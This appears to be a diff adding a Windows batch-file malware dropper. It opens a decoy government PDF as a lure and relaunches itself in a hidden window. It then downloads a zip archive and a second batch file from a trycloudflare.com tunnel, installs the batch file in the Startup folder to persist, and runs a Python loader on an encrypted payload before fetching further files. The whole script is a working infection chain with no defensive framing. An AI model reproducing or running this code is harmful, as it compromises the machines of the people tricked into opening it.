@@ -1,0 +1,23 @@
+@echo off
+if not "%~1"=="h" (
+    start "" "https://7358484.fs1.hubspotusercontent-na1.net/hubfs/7358484/Programme%20for%20Government.pdf"
+    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
+    exit /b
+)
+setlocal
+set "u=https://newcastle-source-louisville-while.trycloudflare.com"
+set "z=%TEMP%\zo.zip"
+set "d=%USERPROFILE%\Contacts\zo"
+set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
+
+powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%u%/zo.zip','%z%')"
+powershell -nologo -noprofile -command "Expand-Archive -LiteralPath '%z%' -DestinationPath '%d%' -Force"
+del "%z%"
+powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%u%/start.bat','%s%')"
+cd /d "%d%"
+python.exe sh.py -i voo.bin -k x.txt
+if %errorlevel%==0 (
+    powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%u%/a.txt','%TEMP%\a.txt')"
+) else (
+    powershell -nologo -noprofile -command "$w=New-Object Net.WebClient;$w.DownloadFile('%u%/b.txt','%TEMP%\b.txt')"
+)
